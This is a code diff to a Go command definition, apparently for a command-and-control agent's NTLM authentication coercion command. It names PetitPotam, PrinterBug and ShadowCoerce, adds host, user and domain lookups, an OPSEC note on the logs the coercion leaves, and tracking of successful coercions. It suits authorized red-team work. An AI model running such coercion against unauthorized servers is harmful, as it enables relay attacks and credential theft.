@@ -25,12 +25,13 @@ func init() {
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
-				Name:             "server",
-				CLIName:          "server",
-				ModalDisplayName: "Target Server",
-				Description:      "Server to coerce (IP or hostname) — this server will authenticate to the listener",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				DefaultValue:     "",
+				Name:                 "server",
+				CLIName:              "server",
+				ModalDisplayName:     "Target Server",
+				Description:          "Server to coerce (IP or hostname) — this server will authenticate to the listener",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:         "",
+				DynamicQueryFunction: getActiveHostList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
 				},
@@ -65,6 +66,7 @@ func init() {
 				Description:      "Account for RPC authentication (DOMAIN\\user or user@domain)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
+				DynamicQueryFunction: getCallbackUserList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
 				},
@@ -98,6 +100,7 @@ func init() {
 				Description:      "Domain name (auto-detected from username if DOMAIN\\user or user@domain format)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
+				DynamicQueryFunction: getCallbackDomainList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: false, GroupName: "Default"},
 				},
@@ -113,6 +116,15 @@ func init() {
 					{ParameterIsRequired: false, GroupName: "Default"},
 				},
 			},
+		},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: Authentication coercion completed. NTLM authentication attempts from target servers generate Event ID 4624/4625 and SMB connection logs. Coerced connections may be visible in NDR and firewall logs.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -199,6 +211,35 @@ func init() {
 
 			createArtifact(taskData.Task.ID, "Network Connection", fmt.Sprintf("NTLM coercion: %s → %s via %s", server, listener, method))
 
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			server, _ := processResponse.TaskData.Args.GetStringArg("server")
+			listener, _ := processResponse.TaskData.Args.GetStringArg("listener")
+			// Track successful coercion attempts
+			for _, line := range strings.Split(responseText, "\n") {
+				lower := strings.ToLower(line)
+				if strings.Contains(lower, "success") || strings.Contains(lower, "triggered") {
+					method := "unknown"
+					for _, m := range []string{"petitpotam", "printerbug", "shadowcoerce", "MS-EFSR", "MS-RPRN", "MS-FSRVP"} {
+						if strings.Contains(strings.ToLower(responseText), strings.ToLower(m)) {
+							method = m
+							break
+						}
+					}
+					createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
+						fmt.Sprintf("[Coerce] Successful: %s authenticated to %s via %s", server, listener, method))
+					break
+				}
+			}
 			return response
 		},
 	})
